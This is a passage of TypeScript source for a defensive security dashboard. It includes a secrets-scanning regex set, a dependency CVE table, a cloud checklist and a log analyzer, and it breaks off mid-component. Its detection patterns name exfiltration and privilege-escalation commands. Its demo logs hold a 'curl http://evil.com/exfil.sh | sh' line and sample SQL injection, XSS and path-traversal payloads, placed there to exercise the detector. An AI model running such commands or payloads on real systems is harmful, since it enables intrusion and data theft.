"use client";

import { useState, useCallback } from "react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import {
  Shield, Key, Package, Cloud, Globe, BarChart3, Brain, ArrowRight,
  CheckCircle2, AlertTriangle, XCircle, Eye, Search,
  Activity, Play, RotateCcw,
  Loader2,
} from "lucide-react";
import {
  RadarChart, Radar, PolarGrid, PolarAngleAxis, PolarRadiusAxis,
  ResponsiveContainer,
} from "recharts";

/* ═══════════════════════════════════════════════════════════
   ███  SECRETS SCANNER — REAL REGEX ENGINE  ███
   ═══════════════════════════════════════════════════════════ */

interface SecretPattern {
  name: string;
  regex: RegExp;
  severity: "critical" | "high" | "medium";
  fix: string;
}

const SECRET_PATTERNS: SecretPattern[] = [
  { name: "AWS Access Key ID", regex: /(?:^|[^A-Za-z0-9/+=])(?:AKIA|ASIA)[0-9A-Z]{16}(?:[^A-Za-z0-9/+=]|$)/gm, severity: "critical", fix: "Rotate the key in AWS IAM Console immediately. Use environment variables or AWS Secrets Manager." },
  { name: "AWS Secret Access Key", regex: /(?:aws_secret_access_key|aws_secret_key|secret_access_key)\s*[=:]\s*["']?([A-Za-z0-9/+=]{40})["']?/gi, severity: "critical", fix: "Rotate in AWS IAM. Never hardcode credentials — use IAM roles or Secrets Manager." },
  { name: "GitHub Token (ghp/gho/ghu/ghs/ghr)", regex: /(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,255}/g, severity: "critical", fix: "Revoke the token at github.com/settings/tokens and generate a new one with minimal scopes." },
  { name: "GitHub Fine-Grained Token", regex: /github_pat_[A-Za-z0-9_]{22,255}/g, severity: "critical", fix: "Revoke at github.com/settings/tokens and regenerate." },
  { name: "Stripe Secret Key", regex: /sk_live_[A-Za-z0-9]{24,}/g, severity: "critical", fix: "Roll the key in Stripe Dashboard → Developers → API Keys. Use env vars." },
  { name: "Stripe Publishable Key", regex: /pk_live_[A-Za-z0-9]{24,}/g, severity: "medium", fix: "Publishable keys are less sensitive but should still not be in source code." },
  { name: "Slack Token", regex: /xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*/g, severity: "high", fix: "Revoke in Slack admin and regenerate. Use env vars." },
  { name: "Slack Webhook URL", regex: /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]{8,}\/B[A-Z0-9]{8,}\/[A-Za-z0-9]{24,}/g, severity: "high", fix: "Regenerate webhook in Slack app settings." },
  { name: "Google API Key", regex: /AIza[0-9A-Za-z_-]{35}/g, severity: "high", fix: "Restrict the key in Google Cloud Console or regenerate it." },
  { name: "Private Key (RSA/EC/DSA)", regex: /-----BEGIN\s+(RSA|EC|DSA|OPENSSH|PGP)?\s*PRIVATE KEY-----/g, severity: "critical", fix: "Remove from repo immediately. Regenerate the key pair. Use a secrets vault." },
  { name: "JWT / Bearer Token", regex: /(?:eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})/g, severity: "high", fix: "JWTs should never be hardcoded. Use dynamic token generation." },
  { name: "Generic Password Assignment", regex: /(?:password|passwd|pwd|secret)\s*[=:]\s*["'][^"'\s]{8,}["']/gi, severity: "high", fix: "Remove hardcoded passwords. Use environment variables or a secrets manager." },
  { name: "Database Connection String", regex: /(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp):\/\/[^\s"']{10,}/gi, severity: "critical", fix: "Move connection strings to env vars or a secrets manager. Rotate the credentials." },
  { name: "SendGrid API Key", regex: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g, severity: "high", fix: "Revoke and regenerate in SendGrid → Settings → API Keys." },
  { name: "Twilio API Key", regex: /SK[0-9a-fA-F]{32}/g, severity: "high", fix: "Rotate in Twilio Console → API Keys." },
  { name: "Mailgun API Key", regex: /key-[0-9a-zA-Z]{32}/g, severity: "high", fix: "Regenerate in Mailgun Dashboard." },
  { name: "npm Token", regex: /npm_[A-Za-z0-9]{36}/g, severity: "critical", fix: "Revoke with `npm token revoke`. Create new token with minimal permissions." },
  { name: "Docker Hub Token", regex: /dckr_pat_[A-Za-z0-9_-]{20,}/g, severity: "high", fix: "Regenerate in Docker Hub → Account Settings → Security." },
  { name: "Generic API Key Pattern", regex: /(?:api[_-]?key|apikey|api[_-]?secret)\s*[=:]\s*["']([A-Za-z0-9_\-]{20,})["']/gi, severity: "high", fix: "Move API keys to environment variables. Never commit secrets to source control." },
  { name: "Hardcoded IP Address (Internal)", regex: /(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g, severity: "medium", fix: "Internal IPs expose network architecture. Use DNS or config files." },
];

interface SecretFinding {
  pattern: string;
  severity: "critical" | "high" | "medium";
  line: number;
  match: string;
  fix: string;
}

function scanSecrets(code: string): SecretFinding[] {
  const findings: SecretFinding[] = [];
  const lines = code.split("\n");
  const seen = new Set<string>();

  for (const pattern of SECRET_PATTERNS) {
    for (let i = 0; i < lines.length; i++) {
      const matches = lines[i].matchAll(new RegExp(pattern.regex));
      for (const m of matches) {
        const matchText = m[0].length > 60 ? m[0].slice(0, 57) + "..." : m[0];
        const key = `${pattern.name}:${i}:${matchText}`;
        if (seen.has(key)) continue;
        seen.add(key);
        findings.push({
          pattern: pattern.name,
          severity: pattern.severity,
          line: i + 1,
          match: matchText.trim(),
          fix: pattern.fix,
        });
      }
    }
  }
  return findings;
}

/* ═══════════════════════════════════════════════════════════
   ███  DEPENDENCY SCANNER — REAL CVE DATABASE  ███
   ═══════════════════════════════════════════════════════════ */

interface KnownVuln {
  package: string;
  affectedVersions: string;
  severity: "critical" | "high" | "medium" | "low";
  cve: string;
  description: string;
  fix: string;
  matchFn: (version: string) => boolean;
}

function semverLt(a: string, b: string): boolean {
  const pa = a.replace(/[^0-9.]/g, "").split(".").map(Number);
  const pb = b.replace(/[^0-9.]/g, "").split(".").map(Number);
  for (let i = 0; i < 3; i++) {
    const na = pa[i] || 0, nb = pb[i] || 0;
    if (na < nb) return true;
    if (na > nb) return false;
  }
  return false;
}

const KNOWN_VULNS: KnownVuln[] = [
  { package: "log4j", affectedVersions: "<2.17.1", severity: "critical", cve: "CVE-2021-44228", description: "Remote Code Execution via JNDI lookup (Log4Shell)", fix: "Upgrade to 2.17.1+", matchFn: (v) => semverLt(v, "2.17.1") },
  { package: "lodash", affectedVersions: "<4.17.21", severity: "high", cve: "CVE-2021-23337", description: "Command injection via template function", fix: "Upgrade to 4.17.21+", matchFn: (v) => semverLt(v, "4.17.21") },
  { package: "axios", affectedVersions: "<1.6.0", severity: "high", cve: "CVE-2023-45857", description: "CSRF via cookie leak to third-party hosts", fix: "Upgrade to 1.6.0+", matchFn: (v) => semverLt(v, "1.6.0") },
  { package: "express", affectedVersions: "<4.19.2", severity: "medium", cve: "CVE-2024-29041", description: "Open redirect vulnerability", fix: "Upgrade to 4.19.2+", matchFn: (v) => semverLt(v, "4.19.2") },
  { package: "jsonwebtoken", affectedVersions: "<9.0.0", severity: "high", cve: "CVE-2022-23529", description: "Arbitrary code execution via crafted JWK", fix: "Upgrade to 9.0.0+", matchFn: (v) => semverLt(v, "9.0.0") },
  { package: "node-fetch", affectedVersions: "<2.6.7", severity: "high", cve: "CVE-2022-0235", description: "Exposure of sensitive information to an unauthorized actor", fix: "Upgrade to 2.6.7+", matchFn: (v) => semverLt(v, "2.6.7") },
  { package: "minimatch", affectedVersions: "<3.0.5", severity: "high", cve: "CVE-2022-3517", description: "ReDoS vulnerability in pattern matching", fix: "Upgrade to 3.0.5+", matchFn: (v) => semverLt(v, "3.0.5") },
  { package: "semver", affectedVersions: "<7.5.2", severity: "medium", cve: "CVE-2022-25883", description: "ReDoS in semver range parsing", fix: "Upgrade to 7.5.2+", matchFn: (v) => semverLt(v, "7.5.2") },
  { package: "tar", affectedVersions: "<6.1.9", severity: "high", cve: "CVE-2021-37713", description: "Arbitrary file creation/overwrite", fix: "Upgrade to 6.1.9+", matchFn: (v) => semverLt(v, "6.1.9") },
  { package: "moment", affectedVersions: "<2.29.4", severity: "high", cve: "CVE-2022-31129", description: "ReDoS in date string parsing", fix: "Upgrade to 2.29.4+ or migrate to dayjs/date-fns", matchFn: (v) => semverLt(v, "2.29.4") },
  { package: "underscore", affectedVersions: "<1.13.6", severity: "high", cve: "CVE-2021-23358", description: "Arbitrary code execution via template function", fix: "Upgrade to 1.13.6+", matchFn: (v) => semverLt(v, "1.13.6") },
  { package: "qs", affectedVersions: "<6.10.3", severity: "high", cve: "CVE-2022-24999", description: "Prototype pollution", fix: "Upgrade to 6.10.3+", matchFn: (v) => semverLt(v, "6.10.3") },
  { package: "json5", affectedVersions: "<2.2.2", severity: "high", cve: "CVE-2022-46175", description: "Prototype pollution", fix: "Upgrade to 2.2.2+", matchFn: (v) => semverLt(v, "2.2.2") },
  { package: "tough-cookie", affectedVersions: "<4.1.3", severity: "medium", cve: "CVE-2023-26136", description: "Prototype pollution", fix: "Upgrade to 4.1.3+", matchFn: (v) => semverLt(v, "4.1.3") },
  { package: "got", affectedVersions: "<11.8.5", severity: "medium", cve: "CVE-2022-33987", description: "Redirect to UNIX socket", fix: "Upgrade to 11.8.5+", matchFn: (v) => semverLt(v, "11.8.5") },
  { package: "shell-quote", affectedVersions: "<1.7.3", severity: "critical", cve: "CVE-2021-42740", description: "Command injection", fix: "Upgrade to 1.7.3+", matchFn: (v) => semverLt(v, "1.7.3") },
  { package: "xml2js", affectedVersions: "<0.5.0", severity: "medium", cve: "CVE-2023-0842", description: "Prototype pollution", fix: "Upgrade to 0.5.0+", matchFn: (v) => semverLt(v, "0.5.0") },
  { package: "webpack-dev-middleware", affectedVersions: "<5.3.4", severity: "high", cve: "CVE-2024-29180", description: "Path traversal allows access to files outside docroot", fix: "Upgrade to 5.3.4+", matchFn: (v) => semverLt(v, "5.3.4") },
  { package: "ip", affectedVersions: "<2.0.1", severity: "high", cve: "CVE-2024-29415", description: "SSRF bypass via incorrect IP classification", fix: "Upgrade to 2.0.1+", matchFn: (v) => semverLt(v, "2.0.1") },
  { package: "django", affectedVersions: "<4.2.11", severity: "high", cve: "CVE-2024-27351", description: "ReDoS in Truncator", fix: "Upgrade to 4.2.11+", matchFn: (v) => semverLt(v, "4.2.11") },
  { package: "flask", affectedVersions: "<2.3.2", severity: "high", cve: "CVE-2023-30861", description: "Session cookie exposure on cross-domain redirects", fix: "Upgrade to 2.3.2+", matchFn: (v) => semverLt(v, "2.3.2") },
  { package: "requests", affectedVersions: "<2.31.0", severity: "medium", cve: "CVE-2023-32681", description: "Proxy-Authorization header leakage", fix: "Upgrade to 2.31.0+", matchFn: (v) => semverLt(v, "2.31.0") },
  { package: "pillow", affectedVersions: "<10.2.0", severity: "high", cve: "CVE-2023-50447", description: "Arbitrary code execution via crafted image", fix: "Upgrade to 10.2.0+", matchFn: (v) => semverLt(v, "10.2.0") },
  { package: "cryptography", affectedVersions: "<42.0.0", severity: "high", cve: "CVE-2024-26130", description: "NULL pointer dereference in PKCS12 parsing", fix: "Upgrade to 42.0.0+", matchFn: (v) => semverLt(v, "42.0.0") },
];

interface DepVuln {
  package: string;
  version: string;
  severity: "critical" | "high" | "medium" | "low";
  cve: string;
  description: string;
  fix: string;
}

function parseDeps(input: string): Record<string, string> {
  const deps: Record<string, string> = {};
  try {
    const json = JSON.parse(input);
    const allDeps = { ...json.dependencies, ...json.devDependencies };
    for (const [name, ver] of Object.entries(allDeps)) {
      deps[name] = String(ver).replace(/^[\^~>=<\s]+/, "");
    }
    return deps;
  } catch {
    const lines = input.split("\n");
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) continue;
      const m = trimmed.match(/^([a-zA-Z0-9._-]+)\s*[=~><]+\s*([0-9][0-9.]*)/);
      if (m) deps[m[1].toLowerCase()] = m[2];
      const g = trimmed.match(/['"]([^:'"]+):([^:'"]+):([0-9][^'"]*)['"]/);
      if (g) deps[g[2]] = g[3];
    }
    return deps;
  }
}

function scanDependencies(input: string): { deps: Record<string, string>; vulns: DepVuln[] } {
  const deps = parseDeps(input);
  const vulns: DepVuln[] = [];
  for (const [name, version] of Object.entries(deps)) {
    for (const known of KNOWN_VULNS) {
      if (name.toLowerCase() === known.package.toLowerCase() && known.matchFn(version)) {
        vulns.push({ package: name, version, severity: known.severity, cve: known.cve, description: known.description, fix: known.fix });
      }
    }
  }
  return { deps, vulns };
}

/* ═══════════════════════════════════════════════════════════
   ███  CLOUD CONFIG SCANNER — REAL CHECKLIST ENGINE  ███
   ═══════════════════════════════════════════════════════════ */

interface CloudCheck {
  id: string;
  category: string;
  platform: "AWS" | "GCP" | "Azure" | "General";
  question: string;
  severity: "critical" | "high" | "medium" | "low";
  failMessage: string;
  passMessage: string;
  fix: string;
}

const CLOUD_CHECKS: CloudCheck[] = [
  { id: "s3-public", category: "Storage", platform: "AWS", question: "Are all S3 buckets set to private (no public access)?", severity: "critical", failMessage: "Public S3 buckets can expose sensitive data", passMessage: "S3 buckets are properly restricted", fix: "Enable S3 Block Public Access at account level. Review bucket policies." },
  { id: "iam-mfa", category: "Identity", platform: "AWS", question: "Is MFA enabled for all IAM users (especially root)?", severity: "critical", failMessage: "IAM accounts without MFA are vulnerable to credential theft", passMessage: "MFA is enabled for IAM users", fix: "Enable MFA for all IAM users in AWS Console → IAM → Users → Security Credentials." },
  { id: "iam-roles", category: "Identity", platform: "AWS", question: "Do IAM roles follow least privilege (no AdministratorAccess)?", severity: "high", failMessage: "Overly permissive IAM roles increase blast radius", passMessage: "IAM roles follow least privilege", fix: "Audit IAM policies. Replace AdministratorAccess with specific service permissions." },
  { id: "rds-public", category: "Database", platform: "AWS", question: "Are RDS/database instances NOT publicly accessible?", severity: "critical", failMessage: "Publicly accessible databases can be exploited", passMessage: "Databases are not publicly accessible", fix: "Set PubliclyAccessible=false. Use VPC security groups to restrict access." },
  { id: "rds-encrypted", category: "Database", platform: "AWS", question: "Is encryption at rest enabled for all databases?", severity: "high", failMessage: "Unencrypted databases risk data exposure if storage is compromised", passMessage: "Database encryption at rest is enabled", fix: "Enable encryption at rest for RDS instances. Use AWS KMS for key management." },
  { id: "vpc-flow", category: "Network", platform: "AWS", question: "Are VPC Flow Logs enabled?", severity: "medium", failMessage: "Without flow logs, you cannot audit network traffic", passMessage: "VPC Flow Logs are enabled", fix: "Enable VPC Flow Logs in VPC Console → Flow Logs → Create flow log." },
  { id: "sg-open", category: "Network", platform: "AWS", question: "Are security groups restricted (no 0.0.0.0/0 on SSH/RDP)?", severity: "critical", failMessage: "Open SSH/RDP to the internet enables brute force attacks", passMessage: "Security groups properly restrict access", fix: "Remove 0.0.0.0/0 rules for ports 22/3389. Use VPN or bastion hosts instead." },
  { id: "cloudtrail", category: "Logging", platform: "AWS", question: "Is CloudTrail enabled for all regions?", severity: "high", failMessage: "Without CloudTrail you cannot audit API activity", passMessage: "CloudTrail is enabled across all regions", fix: "Enable CloudTrail in all regions with S3 log delivery and SNS notifications." },
  { id: "gcs-public", category: "Storage", platform: "GCP", question: "Are GCS buckets private (no allUsers/allAuthenticatedUsers)?", severity: "critical", failMessage: "Public GCS buckets expose data to the internet", passMessage: "GCS buckets are properly restricted", fix: "Remove allUsers and allAuthenticatedUsers from bucket IAM. Use uniform bucket-level access." },
  { id: "gcp-sa", category: "Identity", platform: "GCP", question: "Are service account keys rotated and minimal?", severity: "high", failMessage: "Stale service account keys are a major attack vector", passMessage: "Service account keys are managed properly", fix: "Prefer Workload Identity. If keys are required, rotate every 90 days." },
  { id: "gcp-audit", category: "Logging", platform: "GCP", question: "Is Cloud Audit Logging enabled for all services?", severity: "medium", failMessage: "Insufficient audit logging hinders incident response", passMessage: "Audit logging is properly configured", fix: "Enable Data Access audit logs for critical services in IAM → Audit Logs." },
  { id: "azure-nsg", category: "Network", platform: "Azure", question: "Are NSGs configured with no open RDP/SSH to internet?", severity: "critical", failMessage: "Open RDP/SSH enables brute force attacks", passMessage: "NSGs properly restrict remote access", fix: "Remove Any/Any rules for ports 22/3389. Use Azure Bastion for remote access." },
  { id: "azure-storage", category: "Storage", platform: "Azure", question: "Are storage accounts NOT allowing anonymous blob access?", severity: "critical", failMessage: "Anonymous blob access can expose sensitive files", passMessage: "Storage accounts properly restrict access", fix: "Disable anonymous access in Storage Account → Configuration → Blob anonymous access: Disabled." },
  { id: "azure-keyvault", category: "Secrets", platform: "Azure", question: "Are secrets stored in Key Vault (not in app config)?", severity: "high", failMessage: "Secrets in app config can be leaked via source control or logs", passMessage: "Secrets are managed through Key Vault", fix: "Migrate secrets to Azure Key Vault. Use managed identities for access." },
  { id: "https-only", category: "Network", platform: "General", question: "Is HTTPS enforced everywhere (no HTTP fallback)?", severity: "high", failMessage: "HTTP allows traffic interception and MITM attacks", passMessage: "HTTPS is enforced", fix: "Force HTTPS redirects. Use HSTS headers with long max-age." },
  { id: "encryption-transit", category: "Encryption", platform: "General", question: "Is encryption in transit (TLS 1.2+) enforced?", severity: "high", failMessage: "Old TLS versions have known vulnerabilities", passMessage: "TLS 1.2+ is enforced", fix: "Disable TLS 1.0/1.1. Configure TLS 1.2 minimum on all services." },
  { id: "logging-central", category: "Logging", platform: "General", question: "Is centralized logging configured?", severity: "medium", failMessage: "Decentralized logs are hard to monitor and correlate", passMessage: "Centralized logging is configured", fix: "Use CloudWatch, Stackdriver, or a SIEM to aggregate all logs." },
  { id: "backup", category: "Data", platform: "General", question: "Are automated backups configured and tested?", severity: "high", failMessage: "Without tested backups, data loss is unrecoverable", passMessage: "Backups are properly configured", fix: "Enable automated backups. Test restoration quarterly." },
];

/* ═══════════════════════════════════════════════════════════
   ███  AI LOG ANALYZER — REAL PATTERN ENGINE  ███
   ═══════════════════════════════════════════════════════════ */

interface LogFinding {
  type: string;
  severity: "critical" | "high" | "medium" | "low";
  details: string;
  evidence: string;
  fix: string;
}

function analyzeLogs(input: string): LogFinding[] {
  const findings: LogFinding[] = [];
  const lines = input.split("\n");
  const seen = new Set<string>();

  // 1. Failed login detection
  const failedLogins: { line: number; text: string }[] = [];
  const failedPatterns = /(?:failed\s+login|authentication\s+failed|login\s+failed|invalid\s+(?:password|credentials)|unauthorized|401|access\s+denied|permission\s+denied)/gi;
  for (let i = 0; i < lines.length; i++) {
    if (failedPatterns.test(lines[i])) failedLogins.push({ line: i + 1, text: lines[i].trim() });
    failedPatterns.lastIndex = 0;
  }
  if (failedLogins.length >= 3) {
    findings.push({
      type: "Brute Force Attempt",
      severity: "critical",
      details: `${failedLogins.length} failed login attempts detected — possible brute force attack`,
      evidence: failedLogins.slice(0, 3).map((f) => `Line ${f.line}: ${f.text.slice(0, 100)}`).join("\n"),
      fix: "Implement rate limiting, account lockout after 5 failed attempts, and notify the user.",
    });
  } else if (failedLogins.length > 0) {
    findings.push({
      type: "Failed Authentication",
      severity: "medium",
      details: `${failedLogins.length} failed login attempt(s) detected`,
      evidence: failedLogins.map((f) => `Line ${f.line}: ${f.text.slice(0, 100)}`).join("\n"),
      fix: "Monitor for patterns. Implement account lockout and alerting.",
    });
  }

  // 2. Suspicious IP activity
  const ipPattern = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g;
  const ipCounts: Record<string, number> = {};
  for (const line of lines) {
    const ips = line.matchAll(ipPattern);
    for (const ip of ips) {
      const addr = ip[1];
      if (addr.startsWith("127.") || addr.startsWith("0.") || addr === "255.255.255.255") continue;
      ipCounts[addr] = (ipCounts[addr] || 0) + 1;
    }
  }
  const suspiciousIps = Object.entries(ipCounts).filter(([, count]) => count >= 5).sort((a, b) => b[1] - a[1]);
  if (suspiciousIps.length > 0) {
    findings.push({
      type: "High-Frequency IP Activity",
      severity: "high",
      details: `${suspiciousIps.length} IP(s) with abnormally high request frequency`,
      evidence: suspiciousIps.slice(0, 5).map(([ip, count]) => `${ip} — ${count} occurrences`).join("\n"),
      fix: "Investigate these IPs. Block if malicious. Implement IP-based rate limiting.",
    });
  }

  // 3. Off-hours activity
  const timePattern = /\b(\d{2}):(\d{2})(?::(\d{2}))?\b/g;
  let offHoursCount = 0;
  for (const line of lines) {
    const times = line.matchAll(timePattern);
    for (const t of times) {
      const hour = parseInt(t[1]);
      if (hour >= 0 && hour <= 5) offHoursCount++;
    }
  }
  if (offHoursCount >= 3) {
    findings.push({
      type: "Off-Hours Activity",
      severity: "medium",
      details: `${offHoursCount} events detected between 00:00–05:59 (potential unauthorized access)`,
      evidence: `${offHoursCount} log entries with timestamps in early morning hours`,
      fix: "Review if these actions are expected. Implement alerts for off-hours admin activity.",
    });
  }

  // 4. SQL injection / XSS patterns
  const injectionPatterns = /(?:union\s+select|or\s+1\s*=\s*1|drop\s+table|<script>|alert\s*\(|onerror\s*=|onclick\s*=|eval\s*\(|exec\s*\(|cmd\s*=|system\s*\(|\.\.\/\.\.\/)/gi;
  const injectionLines: number[] = [];
  for (let i = 0; i < lines.length; i++) {
    if (injectionPatterns.test(lines[i])) injectionLines.push(i + 1);
    injectionPatterns.lastIndex = 0;
  }
  if (injectionLines.length > 0) {
    findings.push({
      type: "Injection Attack Patterns",
      severity: "critical",
      details: `${injectionLines.length} log entries contain SQL injection or XSS payloads`,
      evidence: `Lines: ${injectionLines.slice(0, 10).join(", ")}`,
      fix: "This indicates active attack attempts. Verify WAF is active. Audit input validation. Check if any attacks succeeded.",
    });
  }

  // 5. Privilege escalation
  const privEsc = /(?:sudo|su\s+-|chmod\s+777|chown\s+root|adduser|useradd|usermod.*admin|grant\s+all|alter\s+user|role.*admin)/gi;
  const privLines: number[] = [];
  for (let i = 0; i < lines.length; i++) {
    if (privEsc.test(lines[i])) privLines.push(i + 1);
    privEsc.lastIndex = 0;
  }
  if (privLines.length > 0) {
    findings.push({
      type: "Privilege Escalation Activity",
      severity: "high",
      details: `${privLines.length} privilege modification commands detected`,
      evidence: `Lines: ${privLines.slice(0, 10).join(", ")}`,
      fix: "Verify these are authorized changes. Implement approval workflows for privilege changes.",
    });
  }

  // 6. Data exfiltration
  const exfilPatterns = /(?:curl\s+.*\|.*sh|wget\s+.*-O|nc\s+-.*\d{1,3}\.\d{1,3}|base64\s+.*\||scp\s+|rsync\s+.*@|s3\s+cp\s+s3:)/gi;
  for (let i = 0; i < lines.length; i++) {
    if (exfilPatterns.test(lines[i])) {
      const key = "exfil";
      if (!seen.has(key)) {
        seen.add(key);
        findings.push({
          type: "Potential Data Exfiltration",
          severity: "critical",
          details: "Commands associated with data transfer/exfiltration detected",
          evidence: `Line ${i + 1}: ${lines[i].trim().slice(0, 120)}`,
          fix: "Investigate immediately. Check for unauthorized data transfers. Review DLP policies.",
        });
      }
    }
    exfilPatterns.lastIndex = 0;
  }

  // 7. Error spikes
  const errorPatterns = /(?:error|exception|fatal|panic|segfault|crash|oom|killed)/gi;
  let errorCount = 0;
  for (const line of lines) {
    if (errorPatterns.test(line)) errorCount++;
    errorPatterns.lastIndex = 0;
  }
  if (errorCount >= 5) {
    findings.push({
      type: "Error Spike",
      severity: "medium",
      details: `${errorCount} error/exception entries detected — possible instability or DoS`,
      evidence: `${errorCount} error-related log entries`,
      fix: "Investigate root cause. High error rates can indicate attacks or system failures.",
    });
  }

  return findings;
}

/* ═══════════════════════════════════════════════════════════
   ███  SECURITY SCORE CALCULATOR  ███
   ═══════════════════════════════════════════════════════════ */

interface ScanResults {
  secrets: SecretFinding[];
  depVulns: DepVuln[];
  depTotal: number;
  cloudAnswers: Record<string, boolean | null>;
  apiScore: number | null;
  logFindings: LogFinding[];
}

function calculateScores(results: ScanResults) {
  const secretsPenalty = results.secrets.reduce((sum, f) => sum + (f.severity === "critical" ? 3 : f.severity === "high" ? 2 : 1), 0);
  const secretsScore = Math.max(0, 10 - secretsPenalty);

  const depPenalty = results.depVulns.reduce((sum, v) => sum + (v.severity === "critical" ? 3 : v.severity === "high" ? 2 : 1), 0);
  const depsScore = results.depTotal > 0 ? Math.max(0, 10 - depPenalty) : 5;

  const answered = Object.entries(results.cloudAnswers).filter(([, v]) => v !== null);
  const passed = answered.filter(([, v]) => v === true).length;
  const cloudScore = answered.length > 0 ? Math.round((passed / answered.length) * 10 * 10) / 10 : 5;

  const apiScore = results.apiScore ?? 5;

  const logPenalty = results.logFindings.reduce((sum, f) => sum + (f.severity === "critical" ? 3 : f.severity === "high" ? 2 : f.severity === "medium" ? 1 : 0.5), 0);
  const logsScore = Math.max(0, 10 - logPenalty);

  const overall = Math.round(((secretsScore + depsScore + cloudScore + apiScore + logsScore) / 5) * 10) / 10;

  return { secrets: secretsScore, deps: depsScore, cloud: cloudScore, api: apiScore, logs: logsScore, overall };
}

/* ═══════════════════════════════════════════════════════════
   ███  DEMO DATA  ███
   ═══════════════════════════════════════════════════════════ */

const DEMO_CODE = `// config/database.ts
const config = {
  database: "mongodb+srv://admin:SuperSecretPass123@cluster0.abc123.mongodb.net/production",
  aws_access_key_id: "AKIAIOSFODNN7EXAMPLE",
  aws_secret_access_key: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  stripe_key: "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
  github_token: "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
  jwt_secret: "my-super-secret-jwt-key-12345678",
  password: "admin123!@#",
  api_key: "AIzaSyBxSfGkE6vP3Q2xN8R1j5t7u9w0yAcBdEf",
  sendgrid: "SG.abcdefghijklmnopqrstuv.wxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678",
};

// Internal API endpoint
const API_BASE = "http://10.0.1.50:3000/api";

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGcY5unA...
-----END RSA PRIVATE KEY-----
`;

const DEMO_PACKAGE_JSON = `{
  "name": "fintech-app",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.17.1",
    "lodash": "4.17.20",
    "axios": "0.21.4",
    "jsonwebtoken": "8.5.1",
    "moment": "2.29.1",
    "node-fetch": "2.6.1",
    "qs": "6.9.4",
    "json5": "2.2.0",
    "tar": "6.1.0",
    "minimatch": "3.0.4",
    "semver": "7.3.5",
    "shell-quote": "1.7.2"
  },
  "devDependencies": {
    "webpack-dev-middleware": "5.3.0"
  }
}`;

const DEMO_LOGS = `2026-03-14 01:12:33 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:35 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:36 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:38 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:40 [WARN] Failed login attempt for user admin from 185.143.223.47
2026-03-14 01:12:42 [WARN] Failed login attempt for user root from 185.143.223.47
2026-03-14 01:12:44 [WARN] Failed login attempt for user admin from 91.234.56.78
2026-03-14 01:13:01 [ERROR] Authentication failed for API key from 185.143.223.47
2026-03-14 02:30:15 [INFO] Request: GET /api/users?id=1 OR 1=1 from 45.33.32.156
2026-03-14 02:30:16 [INFO] Request: GET /search?q=<script>alert(document.cookie)</script> from 45.33.32.156
2026-03-14 02:31:00 [WARN] 403 Access denied for path ../../etc/passwd from 45.33.32.156
2026-03-14 03:15:22 [INFO] sudo su - root executed by user deploy
2026-03-14 03:15:45 [INFO] chmod 777 /var/www/html/uploads executed by user deploy
2026-03-14 03:22:10 [ERROR] OutOfMemoryError in worker-3
2026-03-14 03:22:11 [FATAL] Application crash: segfault in module auth
2026-03-14 03:22:12 [ERROR] exception in request handler: NullPointerException
2026-03-14 03:22:15 [ERROR] panic: runtime error: index out of range
2026-03-14 03:22:20 [ERROR] fatal error: concurrent map writes
2026-03-14 04:00:00 [INFO] curl http://evil.com/exfil.sh | sh executed from 10.0.1.15
2026-03-14 04:01:00 [INFO] aws s3 cp s3://production-backup/dump.sql /tmp/ from 10.0.1.15`;

const DEMO_API_URL = "https://securecodereviews.com";

const DEMO_CLOUD_ANSWERS: Record<string, boolean> = {
  "s3-public": false,
  "iam-mfa": true,
  "iam-roles": false,
  "rds-public": false,
  "rds-encrypted": true,
  "vpc-flow": false,
  "sg-open": false,
  "cloudtrail": true,
  "gcs-public": true,
  "gcp-sa": false,
  "gcp-audit": true,
  "azure-nsg": true,
  "azure-storage": false,
  "azure-keyvault": false,
  "https-only": true,
  "encryption-transit": true,
  "logging-central": false,
  "backup": true,
};

/* ═══════════════════════════════════════════════════════════
   ███  MAIN SHIELDX PAGE  ███
   ═══════════════════════════════════════════════════════════ */

type TabKey = "secrets" | "deps" | "cloud" | "api" | "logs" | "score";

const TABS: { key: TabKey; label: string; icon: typeof Shield }[] = [
  { key: "secrets", label: "Secrets Scanner", icon: Key },
  { key: "deps", label: "Dependency Scanner", icon: Package },
  { key: "cloud", label: "Cloud Security", icon: Cloud },
  { key: "api", label: "API Scanner", icon: Globe },
  { key: "logs", label: "Log Analyzer", icon: Brain },
  { key: "score", label: "Security Score", icon: BarChart3 },
];

export default function ShieldXPage() {
  const [activeTab, setActiveTab] = useState<TabKey>("secrets");
  const [isDemo, setIsDemo] = useState(false);

  // Secrets state
  const [secretsInput, setSecretsInput] = useState("");
  const [secretsResults, setSecretsResults] = useState<SecretFinding[] | null>(null);
  const [secretsScanning, setSecretsScanning] = useState(false);

  // Deps state
  const [depsInput, setDepsInput] = useState("");
  const [depsResults, setDepsResults] = useState<{ deps: Record<string, string>; vulns: DepVuln[] } | null>(null);
